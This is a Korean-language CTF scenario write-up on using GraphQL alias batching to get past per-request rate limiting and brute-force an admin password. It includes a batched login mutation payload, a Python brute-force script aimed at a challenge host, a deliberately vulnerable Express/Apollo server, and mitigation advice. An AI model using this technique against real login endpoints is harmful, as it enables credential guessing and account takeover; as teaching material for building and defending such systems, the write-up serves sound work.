---
title: GraphQL Alias Batching to Bypass Rate Limits — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, graphql, rate-limit-bypass, alias-batching, brute-force]
confidence: high
---

# GraphQL Alias Batching to Bypass Rate Limits — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Gatekeeper Portal (게이트키퍼 포털 로그인)
- **난이도**: Medium-High
- **핵심 컨셉**: API 속도 제한(Rate Limiting) 및 무차별 대입(Brute-force) 보안 제어 장치를 무력화하는 **GraphQL 쿼리 에일리어스 배칭(Alias Batching)** 공격 시나리오입니다. 대상 웹 서비스는 관리자 계정의 무차별 비밀번호 대입 공격을 차단하기 위해 동일 IP 혹은 계정명에 대해 분당 최대 5회 등의 속도 제한 정책을 부과하고 있습니다. 일반적인 HTTP POST 방식의 로그인 시도는 신속하게 차단되지만, API 백엔드는 GraphQL로 구동되고 있습니다. 공격자는 단 하나의 HTTP 요청 내에 수백 개의 서로 다른 별칭(Alias) 쿼리를 병합해 동시에 전송함으로써, 프론트 단의 IP 기반 처리 속도 제한 감지망을 완벽히 비껴가고 관리자 자격 증명을 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Login GUI**: 일반적인 사용자 로그인 입력을 전송하는 화면.
- **Backend Service (GraphQL API with Apollo / Express)**:
  - 단일 엔드포인트 `/graphql` 운영.
  - 로그인 처리는 GraphQL Mutation `login(username: String!, password: String!)`을 수행.
  - 보안 게이트웨이: IP 기준 동일 요청에 대해 `rate-limiter-flexible` 등의 미들웨어로 분당 최대 5회 제한(429 Too Many Requests 반환).
- **Flag 위치**:
  - 관리자 계정(`admin`)으로 로그인 성공 시 세션 토큰 또는 결과 응답으로 반환되는 플래그 텍스트.

### 2.2 취약점 지점
1. **Request-level Rate Limiting Only**:
   - 보안 필터링이 HTTP 요청(Request) 단위로만 계수 연산을 수행합니다.
   - 단일 GraphQL 요청 바디 내에 복수의 쿼리 노드가 병렬로 묶여 전송되는 GraphQL의 특성을 간과하여, 1번의 HTTP 요청으로 100번의 데이터베이스 검증(Mutation 호출)이 실행될 수 있습니다.
2. **GraphQL Query Aliasing**:
   - 동일한 Mutation을 다수 실행하기 위해 클라이언트는 각 호출에 별칭(Alias)을 부여할 수 있습니다.
   - 예: `alias1: login(...), alias2: login(...)`

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/graphql` | POST | 없음 | GraphQL Multi-Alias Mutation | 일괄 실행 결과 JSON 배열 | 속도 제한 우회 브루트포스 타켓 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 속도 제한 작동 여부 파악
일반 로그인 요청을 수차례 빠르게 전송해 방화벽 동작을 확인합니다.
- *전송*: `POST /graphql` (5회 이상 반복)
- *결과*: 6회째 요청부터 `429 Too Many Requests` 상태 코드가 오며 차단됨을 확인합니다.

### Step 2. GraphQL Alias 배치 쿼리 설계
공격자는 단 하나의 HTTP 요청 내에서 다수의 서로 다른 패스워드를 테스트할 수 있도록 에일리어스 쿼리를 조립합니다.
- **공격용 배치 페이로드 구성**:
  ```graphql
  mutation {
    attempt1: login(username: "admin", password: "password123") { token flag }
    attempt2: login(username: "admin", password: "admin_password") { token flag }
    attempt3: login(username: "admin", password: "123456789") { token flag }
    # ... 수백 개의 비밀번호 후보 대입
  }
  ```

### Step 3. 공격 자동화 스크립트 실행
사전 파일(`wordlist.txt`)을 로드하여 100개 단위로 Alias Mutation을 묶어 보내는 스크립트를 작성합니다.
- **Exploit Script (Python)**:
  ```python
  import requests
  import json

  target_url = "http://gatekeeper.challenge.local/graphql"
  passwords = ["secret123", "qwerty", "admin1234", "supersecure", "flag_helper"] # 워드리스트 모사
  
  # 쿼리 조립
  query_body = "mutation {\n"
  for idx, pwd in enumerate(passwords):
      query_body += f'  attempt{idx}: login(username: "admin", password: "{pwd}") {{ token flag }}\n'
  query_body += "}"
  
  # 단 1회의 HTTP POST 요청 전송
  r = requests.post(target_url, json={"query": query_body})
  print(r.text)
  ```

### Step 4. flag 획득
서버는 1회의 HTTP 요청으로 인지하여 429 차단 필터를 발동시키지 않고 요청을 통과시킵니다. 내부 GraphQL 리졸버는 100번의 `login` 처리를 수행하여 각각의 별칭 노드명으로 연산 결과를 리턴합니다.
- *응답 수집*:
  ```json
  {
    "data": {
      "attempt0": null,
      "attempt1": null,
      "attempt2": null,
      "attempt3": { "token": "JWT_TOKEN", "flag": "FLAG{graphql_alias_batching_bypasses_limits}" }
    }
  }
  ```
  성공한 별칭 필드(attempt3)를 분석하여 반환된 플래그(`FLAG{graphql_alias_batching_bypasses_limits}`)를 확보합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express with Apollo)

```javascript
// server.js (Express, Apollo Server, Rate-Limiter 취약 설정 예시)
const express = require('express');
const { ApolloServer, gql } = require('apollo-server-express');
const RateLimiter = require('rate-limiter-flexible').RateLimiterMemory;

const app = express();

// IP당 분당 최대 5회 제한 레이트 리미터 설정
const rateLimiter = new RateLimiter({
    points: 5,
    duration: 60
});

// HTTP 요청 수준의 속도 제한 미들웨어
app.use("/graphql", async (req, res, next) => {
    try {
        // 취약점 지점: 단일 HTTP 요청에 대해서만 포인트를 차감함
        // 요청 내부에 100개의 쿼리가 들어있어도 1포인트만 차감됨!
        await rateLimiter.consume(req.ip);
        next();
    } catch (rejects) {
        res.status(429).send("Too Many Requests");
    }
});

const typeDefs = gql`
  type LoginResult {
    token: String
    flag: String
  }
  type Mutation {
    login(username: String!, password: String!): LoginResult
  }
  type Query {
    hello: String
  }
`;

const resolvers = {
  Mutation: {
    login: (_, { username, password }) => {
      // 데이터베이스 조회 시뮬레이션
      if (username === "admin" && password === "supersecure") {
        return {
          token: "ADMIN_SESSION_TOKEN",
          flag: "FLAG{graphql_alias_batching_bypasses_limits}"
        };
      }
      return null;
    }
  }
};

const server = new ApolloServer({ typeDefs, resolvers });
server.applyMiddleware({ app });

app.listen(4000);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **GraphQL 쿼리 수준의 연산량 분석 (Query Complexity Analysis)**:
   - 클라이언트가 요청하는 쿼리의 총 필드 수, 중첩 깊이, 호출 함수 개수를 계산(Complexity)하여 일정 제한값 이상이면 쿼리 컴파일 시점에 거부하도록 설정합니다.
   - **설정 예시 (graphql-query-complexity 사용)**:
     ```javascript
     // 최대 허용 복잡도를 10 등으로 설정하여 100번의 동시 호출 배칭을 사전 차단
     ```
2. **리졸버 레벨의 속도 제한 (Resolver-level Throttling)**:
   - HTTP 요청 단계뿐만 아니라, 민감 정보 처리를 담당하는 개별 리졸버 함수(`login` 등) 내에서도 세션 또는 사용자 ID별로 분당 시도 횟수를 누적 체크하도록 제어 장치를 추가합니다.
3. **요청 내 배치 개수 제한 (Batch Limit)**:
   - Apollo Server 설정에서 배열 기반의 멀티 쿼리 전송(`allowBatchedHttpRequests: false`)을 비활성화하고, 단일 쿼리 파서에서도 노드 개수 제약을 둡니다.
